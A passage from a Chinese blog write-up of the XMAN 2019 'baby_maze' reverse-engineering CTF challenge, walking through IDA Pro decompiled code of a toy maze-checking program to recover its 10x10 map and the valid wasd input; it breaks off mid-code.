      <link href="/2019/08/08/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-Re-baby-maze/"/>
      <url>/2019/08/08/XMAN-2019-%E2%95%95%C3%BA%E2%95%93%E2%96%8C-Re-baby-maze/</url>
      
        <content type="html"><![CDATA[<p>天舒的师傅真的讲的不错，逻辑结构清晰，循序渐进，题目难易适中现在感觉其实逆向工程是很多东西的基础，比如要PWN一道题目，也需要清晰地认识到程序的流程，不只是PWN，现在Web也需要很多的逆向工程的知识。然后其实逆向工程和杂项和密码学结合还是挺深的，或者说逆向工程考的就是基本功，对编程能力和计算机原理的认识，所以我觉得逆向工程十分好玩</p><p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p><h2 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h2><p>这题是一道和很基础的<strong>迷宫</strong>类型题目</p><p>迷宫问题有以下特点: </p><ul><li>在内存中布置一张 “地图”</li><li>将用户输入限制在少数几个字符范围内. </li><li>一般只有一个迷宫入口和一个迷宫出口</li></ul><p>布置的地图可以由可显字符 (比如<code>#</code>和<code>*</code>)组合而成 (这非常明显,  查看字符串基本就知道这是个迷宫题了.), 也可以单纯用不可显的十六进制值进行表示. 可以将地图直接组成一条非常长的字符串,  或是一行一行分开布置. 如果是一行一行分开布置的话, 因为迷宫一般都会比较大, 所以用于按行(注意, 布置并非按顺序布置,  每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显重复多次. </p><p>而被限制的字符通常会是一些方便记忆的组合 (不是也没办法), 比如<code>w/s/a/d</code>, <code>h/j/k/l</code>, <code>l/r/u/d</code>这样的类似组合. 当然各个键具体的操作需要经过分析判断 (像那种只用一条字符串表示迷宫的, 就可以用<code>t</code>键表示向右移动<code>12</code>个字符这样). 对于二维的地图, 一般作者都会设置一个<code>X坐标</code>和一个<code>Y坐标</code>用于保存当前位置. 我们也可以根据这个特点来入手分析.</p><p>一般情况下, 迷宫是只有 1 个入口和 1 个出口, 像入口在最左上角<code>(0, 0)</code>位置, 而出口在最右下角<code>(max_X, max_Y)</code>处. 但也有可能是出口在迷宫的正中心, 用一个<code>Y</code>字符表示等等. 解答迷宫题的条件也是需要根据具体情况判断的.  </p><p>当然迷宫的走法可能不止 1 条, 也有情况是有多条走法, 但是要求某一个走法比如说代价最小. 那么这就可以变相为一个算法问题. </p><p>我们首先打开这个程序可以看一下IDA Pro自动生成的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401B60();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input:"</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401350(v4) &amp;&amp; sub_40145A() )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct!\nFlag is your input"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始我们毫无头绪，只是知道大概是需要分析<code>sub_401350</code>和<code>sub_40145A</code>两个函数</p><p>我们先来分析<code>sub_401350</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401350</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a1, <span class="string">"flag&#123;"</span>, <span class="number">5u</span>) || a1[<span class="number">31</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[i + <span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">97</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">119</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">115</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们不难分析出<code>a1</code>其实即为我们输入的<code>flag</code>，且<code>flag</code>的长度为<code>32</code>，然后一个<code>for</code>循环里面的<code>switch</code>语句，相当于我们输入的<code>flag</code>转换数据并存在<code>dword_405060</code>这个数组里面</p><p>然后我们看看<code>switch</code>函数的几个值，<code>97</code>，<code>100</code>，<code>119</code>，<code>115</code>是不是很像<code>ASCII</code>编码，我们把它通过<code>IDA</code>转换为<code>char</code>类型，然后重命名一些函数名称就成了下面的样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401350</span><span class="params">(<span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(flag, <span class="string">"flag&#123;"</span>, <span class="number">5</span>) || flag[<span class="number">31</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( flag[i + <span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">        save[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">        save[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">        save[i] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">        save[i] = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就直观很多了，等于说我们的<code>flag</code>仅限于<code>a</code>, <code>d</code>, <code>w</code>, <code>s</code>这四个字母，这就很像一道迷宫题的样子，我们继续分析<code>sub_40145A</code>这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_40145A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">4</span>;</span><br><span class="line">  v2 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 += dword_402068[save[i]];</span><br><span class="line">    v2 += dword_402078[save[i]];</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> || v3 &lt; <span class="number">0</span> || v2 &gt; <span class="number">9</span> || v2 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">35</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先分析一下<code>dword_402068</code>和<code>dword_402078</code>这两个数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00402068</span> ; <span class="keyword">int</span> dword_402068[]</span><br><span class="line">.data:<span class="number">00402068</span> dword_402068    dd <span class="number">0</span>                    ; DATA XREF: sub_40145A+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">0040206</span>C                 align <span class="number">10</span>h</span><br><span class="line">.data:<span class="number">00402070</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402071</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402072</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402073</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402074</span>                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">00402075</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402076</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402077</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里有个坑，其他数据都是以<code>db</code>类型保存，而第一个为<code>dd</code>格式，</p><p><code>db</code>定义字节类型变量，一个字节数据占<code>1</code>个字节单元，读完一个，偏移量加<code>1</code></p><p><code>dw</code>定义字类型变量，一个字数据占<code>2</code>个字节单元，读完一个，偏移量加<code>2</code></p><p><code>dd</code>定义双字类型变量，一个双字数据占<code>4</code>个字节单元，读完一个，偏移量加<code>4</code></p><p>在<code>IDA</code>里面我们可以通过<code>D</code>键更改数据的类型，可以变为这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="number">00402068</span> ; <span class="keyword">int</span> byte_402068[]</span><br><span class="line">.data:<span class="number">00402068</span> byte_402068     db <span class="number">0</span>                    ; DATA XREF: sub_40145A+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">00402069</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>C                 db <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402070</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402071</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402072</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402073</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402074</span>                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">00402075</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402076</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402077</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure><p>不难看出其实保存的数据就是十六进制下的<code>0</code>，<code>0</code>，<code>-1</code>，<code>1</code>，之前的align就是为了对齐内存数据，从内存数据也可以看出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00402060</span>  <span class="number">2</span>E <span class="number">2</span>E <span class="number">23</span> <span class="number">23</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00402070</span>  FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><code>dword_402068</code>的内存地址位<code>0x00402068</code>到<code>0x00402077</code>，即为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>现在我们来关注<code>dword_402078</code>这个数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="number">00402078</span> dword_402078    dd <span class="number">0F</span>FFFFFFFh           ; DATA XREF: sub_40145A+<span class="number">3</span>E↑r</span><br><span class="line">.data:<span class="number">0040207</span>C                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">0040207</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040207</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040207F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402080</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402081</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402082</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402083</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402084</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402085</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402086</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402087</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402088</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402089</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>C                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402090</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402091</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402092</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402093</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402094</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402095</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402096</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402097</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402098</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402099</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>C                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209F</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure><p>在<code>IDA</code>里面我们可以选中需要导出数据的内存区域，然后按<code>shift+E</code>的快捷键就可以选择各种导出格式方便导出，我们直接选择导出为数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这两个数组也就是改变<code>v3</code>和<code>v2</code>的值，也不太能方便的得知程序的真实意图，我们再看看<code>byte_402000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00402000</span> byte_402000     db <span class="number">23</span>h                  ; DATA XREF: sub_40145A+<span class="number">7</span>A↑r</span><br><span class="line">.data:<span class="number">00402000</span>                                         ; sub_40145A+<span class="number">9F</span>↑r</span><br><span class="line">.data:00402001                 db '#....######.##.###.##.##.###....##.###..####......####.#.##.####.'</span><br><span class="line">.data:00402001                 db '..##....#########.###+#####.....##',0</span><br><span class="line">.data:<span class="number">00402065</span>                 align <span class="number">4</span></span><br></pre></td></tr></table></figure><p>这就是迷宫的地图啊，然后这里有个坑，其实第一个<code>23h</code>也是地图的一部分，也就是<code>#</code>，我们不难得出地图的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#....######.##.###.##.##.###....##.###..####......####.#.##.####...##....#########.###+#####.....##</span><br></pre></td></tr></table></figure><p>所以这是个怎么样的二维地图呢，我们回到函数看到这些代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> || v3 &lt; <span class="number">0</span> || v2 &gt; <span class="number">9</span> || v2 &lt; <span class="number">0</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">35</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><code>[10 * v3 + v2]</code>就是一个模拟二维数组的方式，根据<code>v3 &gt; 9 || v3 &lt; 0 || v2 &gt; 9 || v2 &lt; 0</code>也可以得出这是一个按照<code>10 x 10</code> 排列的地图</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">##....####</span><br><span class="line">##.##.###.</span><br><span class="line">##.##.###.</span><br><span class="line">...##.###.</span><br><span class="line">.####.....</span><br><span class="line">.####.#.##</span><br><span class="line">.####...##</span><br><span class="line">....######</span><br><span class="line">###.###+##</span><br><span class="line">###.....##</span><br></pre></td></tr></table></figure><p><code>v3</code>就是行数，<code>v2</code>就是列数,<code>v3</code>和<code>v2</code>的初始值就是起点，然后根据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>不难得出终点就是<code>+</code>，起点就是二维数组的<code>[4,5]</code>，也就是第五行第六列，我们用其他符号标出起点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">##....####</span><br><span class="line">##.##.###.</span><br><span class="line">##.##.###.</span><br><span class="line">...##.###.</span><br><span class="line">.####<span class="number">0.</span>...</span><br><span class="line">.####.#.##</span><br><span class="line">.####...##</span><br><span class="line">....######</span><br><span class="line">###.###+##</span><br><span class="line">###.....##</span><br></pre></td></tr></table></figure><p>则函数的修复代码应该为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_40145A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> line; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> row; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  row = <span class="number">4</span>;</span><br><span class="line">  line = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    row += s1[save[i]];</span><br><span class="line">    line += s2[save[i]];</span><br><span class="line">    <span class="keyword">if</span> ( row &gt; <span class="number">9</span> || row &lt; <span class="number">0</span> || line &gt; <span class="number">9</span> || line &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">10</span> * row + line] == <span 